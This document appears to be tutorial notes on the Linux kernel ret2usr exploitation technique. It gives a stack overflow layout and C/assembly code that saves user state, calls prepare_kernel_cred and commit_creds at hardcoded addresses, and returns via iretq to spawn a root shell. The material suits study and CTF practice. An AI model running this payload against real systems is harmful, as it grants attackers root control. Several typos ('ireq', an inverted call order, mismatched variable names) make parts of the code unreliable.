# Kernel ROP

## ret2usr

### Requirement

- Kernel ROP
- **no SMEP**
- **no SMAP**
- **no KPTI**

### Idea

- Overwrite the return address with an address in userland

### Exploit

- Overwrite the return address using BOF in kernel space
    | Before overflow | After overflow |
    | :-: | :-: |
    | `canary` | `canary` |
    | `old rbx` | **`0`** |
    | `old r12` | **`0`** |
    | `old rbp` | **`0`** |
    | `return address` | **`ret2usr`** |
- Before returning to userland, you need to execute `sysretq` or `iretq`
    - `ireq` is recommended because `sysretq` is rather complex
    - `ireq` pops the following registers in order:
        - `rip`
        - `cs`
        - `rflags`
        - `rsp`
        - `ss`
    - `rip` can be set to the address of a function that pops a shell
    - `You cannot set cs`, `rflags`, `rsp`, and `ss` to random values (the process may not continue successfully)
        - Instead, you can save the register of `cs`, `rflags`, `rsp`, and `ss` before entering the kernel space
            ```c
            void save_state(){
                __asm__(
                    "mov user_cs, cs;"
                    "mov user_ss, ss;"
                    "mov user_sp, rsp;"
                    "pushf;"
                    "pop user_rflags;"
                );
                puts("[*] Saved state");
            }
            ```
    - Execute `prepare_kernel_cred(commit_creds))`, `ireq`, and `spawn_shell`
        ```c
        long prepare_kernel_cred = 0xffffffff81033e92;
        long commit_creds = 0xffffffff81033d41;
        long user_cs;
        long user_ss;
        long user_rsp;
        long user_rflags;
        void spawn_shell() {
            system("/bin/sh");
        }
        long user_rip = (long)spawn_shell;
        void ret2usr() {
            __asm__ __volatile__ (
                    "xor rdi, rdi;"
                    "mov rax, prepare_kernel_cred;"
                    "call rax;"
                    "mov rdi, rax;"
                    "mov rax, commit_creds;"
                    "call rax;"
                    "mov rax, user_ss;"
                    "push rax;"
                    "mov rax, user_rsp;"
                    "push rax;"
                    "mov rax, user_rflags;"
                    "push rax;"
                    "mov rax, user_cs;"
                    "push rax;"
                    "mov rax, user_rip;"
                    "push rax;"
                    "iretq;"
                    );
        }
        ```
